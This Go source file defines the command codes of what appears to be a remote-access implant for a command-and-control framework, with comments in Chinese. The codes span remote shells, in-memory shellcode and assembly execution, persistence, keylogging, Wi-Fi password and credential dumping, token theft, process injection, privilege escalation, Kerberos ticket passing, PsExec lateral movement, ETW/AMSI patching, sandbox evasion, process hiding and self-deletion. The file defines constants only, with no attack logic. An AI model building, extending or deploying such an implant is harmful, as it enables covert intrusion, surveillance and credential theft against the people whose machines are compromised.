package services

const (
	SLEEP       = 21
	PAUSE       = 22
	SHELL       = 23
	UploadStart = 24
	UploadLoop  = 25
	DOWNLOAD    = 26
	EXIT        = 27
	CD          = 28
	PWD         = 29
	FileBrowse  = 10
	EXECUTE     = 11
	PS          = 12
	KILL        = 13
	DRIVES      = 14
	MKDIR       = 15
	RM          = 16
	CP          = 17
	MV          = 18
	FileContent = 19
	Socks5Start = 20
	Socks5Close = 30
	FILESAVE    = 31 // 文件保存命令
	MODIFYTIME  = 32 // 修改文件时间命令
	HIDEFILE    = 33 // 隐藏文件命令
	UNHIDEFILE  = 34 // 取消隐藏文件命令

	// 屏幕截图和监控命令
	SCREENSHOT1       = 46 // 屏幕截图命令
	START_MONITOR     = 47 // 开始屏幕监控
	STOP_MONITOR      = 48 // 停止屏幕监控
	MONITOR_FRAME     = 49 // 监控帧数据
	GET_MONITOR_FRAME = 50 // 手动获取监控帧

	// HVNC 隐藏桌面（Hidden VNC）
	HVNC_START = 55 // 启动 HVNC 会话（隐藏桌面）
	HVNC_STOP  = 56 // 停止 HVNC 会话
	HVNC_INPUT = 57 // HVNC 输入事件（鼠标/键盘/缩放控制）
	HVNC_FRAME = 58 // HVNC 帧数据（客户端主动推送）

	// 文件管理增强
	UPLOAD_ACK     = 59 // 上传分块确认（客户端→服务端）：requestId(4)|seq(4)|total(4)
	FILE_OP_RESULT = 88 // 文件操作结果确认（客户端→服务端）：requestId(4)|ok(1)|msg

	// SOCKS5代理隧道命令（参照tshell优化）
	SOCKS5_CONNECT = 60 // 建立SOCKS5连接
	TCP_FORWARD    = 61 // TCP端口转发
	HTTP_CONNECT   = 62 // HTTP连接代理
	UDP_SESSION    = 63 // UDP会话请求
	TUNNEL_DATA    = 64 // 隧道数据传输
	TUNNEL_CLOSE   = 65 // 隧道关闭请求
	HTTP_TUNNEL    = 66 // HTTP隧道代理（反向代理模式）

	// 反向SOCKS5代理命令（Tshell架构）
	ReverseSocks5Start = 70 // 启动反向SOCKS5代理
	ReverseSocks5Close = 71 // 关闭反向SOCKS5代理

	// Windows内存执行命令（tshell功能移植）
	ExecuteAssembly    = 40 // .NET程序内存执行
	InlineBin          = 41 // 二进制文件和shellcode内存执行
	ExecuteLinuxScript = 51 // Linux脚本内存执行(fileless sh -s 管道)
	ExecuteLinuxBin    = 52 // Linux二进制执行(/tmp 写执行删)
	ExecuteBof         = 53 // BOF(COFF)内存执行
	ExecuteFile        = 54 // 临时文件执行(非内存加载)

	// 新的统一文件编辑命令
	FILE_EDIT_READ  = 80 // 读取文件内容进行编辑
	FILE_EDIT_WRITE = 81 // 写入编辑后的文件内容

	// Linux交互式终端命令（原生PTY）
	INTERACTIVE_SHELL_START = 35 // 开始Linux原生PTY交互式Shell会话
	INTERACTIVE_SHELL_INPUT = 36 // Linux原生PTY交互式Shell输入
	INTERACTIVE_SHELL_STOP  = 37 // 停止Linux原生PTY交互式Shell会话

	// Windows双引擎Shell命令（非交互式）
	CMD_MODE_START = 38 // 启动CMD模式
	CMD_MODE_INPUT = 39 // 发送CMD命令
	CMD_MODE_STOP  = 42 // 停止CMD模式
	WMI_MODE_START = 43 // 启动WMI模式
	WMI_MODE_INPUT = 44 // 发送WMI命令
	WMI_MODE_STOP  = 45 // 停止WMI模式

	// 持久化命令（B8）：cmdBuf = "方法 [名称]"，方法见 commands.Persist
	PERSIST = 100 // 持久化（registry|schtasks|startup / cron|bashrc）

	// 工具箱命令
	CLIPBOARD  = 102 // 剪贴板读取
	WIFI       = 103 // WiFi密码提取
	SELFDELETE = 104 // 自删除

	// 第二梯队工具
	KEYLOG_START  = 105 // 启动键盘记录
	KEYLOG_GET    = 106 // 获取键盘记录
	KEYLOG_STOP   = 107 // 停止键盘记录
	SERVICES      = 108 // 列出服务
	SERVICE_START = 109 // 启动服务
	SERVICE_STOP  = 110 // 停止服务
	REG_QUERY     = 111 // 注册表查询
	INJECT        = 112 // 进程注入

	// A1-A7 客户端能力增强
	ETW_PATCH     = 113 // ETW 补丁（屏蔽遥测）
	UNHOOK_NTDLL  = 114 // ntdll unhooking
	SANDBOX_CHECK = 115 // 沙箱检测
	ANTIDEBUG     = 116 // 反调试检查
	WMI_PERSIST   = 117 // WMI 无文件持久化（add|remove|list）
	PSEXEC        = 118 // 横向移动：远程执行（target|user|pass|cmd）
	AD_ENUM       = 119 // 域信息收集
	SELF_UPDATE   = 120 // 客户端自我更新
	// 删除进程文件并退出（"删除客户端"流程）
	SELFDELETE_EXIT = 121 // 客户端退出并删除自身二进制

	// Linux 隐藏命令（B12）
	HIDE_PROCESS = 122 // 进程名隐藏（prctl PR_SET_NAME + argv[0] 覆盖）
	HIDE_NET     = 123 // 网络连接隐藏（LD_PRELOAD 过滤 /proc/net，需 root）

	// Token 操作链（A8，须与服务端 pkg/command/cmdType.go 一致）
	MAKE_TOKEN  = 124 // 创建令牌并模拟（make_token <user>|<pass>|<domain>）
	STEAL_TOKEN = 125 // 窃取进程令牌（steal_token <pid>）
	REV2SELF    = 126 // 恢复原始令牌（rev2self）

	// 内存注入通道（A9，须与服务端 pkg/command/cmdType.go 一致）
	// 纯内存接收分块 shellcode 并注入（不落盘；替代文件路径注入）
	INJECT_MEM = 127 // 内存注入（requestId|total|seq|pidLen|pid|techLen|tech|chunk）

	// 批量命令包装（B5，须与服务端 pkg/command/cmdType.go 一致）：
	// 仅轮询协议(HTTP/DNS)批量下发时使用。帧格式 count(4) + N×[len(4)|cmd]，
	// cmd 为完整单条命令帧(cmdType(4)|cmdBuf)。旧服务端永不下发此号。
	CMD_BATCH = 128

	// 文件搜索（功能批，须与服务端 pkg/command/cmdType.go 一致）：
	// 参数 <startDir>|<maxResults>|<keyword>，结果按 FileBrowse 的 D/F 行格式回传
	FILE_SEARCH = 129

	// 凭据获取（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "kind|tech|fileName"。制品经下载通道回传（type22 头 + type26 分块）。
	CRED_DUMP = 130

	// 端口扫描（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "<targets> <ports> [timeoutMs]"（如 "10.0.0.0/24 top 500"）
	PORT_SCAN = 131

	// 提权（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "" | "auto" | "token" | "uac" | "uac_cleanup"。
	// 只派生**新会话**（不改当前进程的令牌模拟状态）：成功与否都不影响已有会话。
	GETSYSTEM = 132

	// Kerberos 票据动作（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "list" | "purge [服务名]" | "ptt <base64 的 kirbi>"。
	// 采集走制品管线（kind=ticket），动作走命令回显。
	KERB_ACTION = 133

	// 清理现场（P1，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "all|persist|files|uac|wmi"（可空格分隔，空串等价 all）。
	// 只清本程序自己留下的持久化项/更新残留/提权与 WMI 副产物，逐条回执。
	CLEANUP = 134

	// 对抗能力开关（P4，须与服务端 pkg/command/cmdType.go 一致）：
	// cmdBuf = "" | "status" | "on <能力>" | "off <能力>" | "reset" | "all on|off"。
	// 能力名：etw / amsi / modhide / spoof / ppid / blockdlls / unhook。
	// 覆盖只在内存里，不跨重连；启动期能力（etw/amsi/unhook）运行期开=立即执行一次，
	// 关掉不会撤销已打的补丁。
	EVASION = 135
)
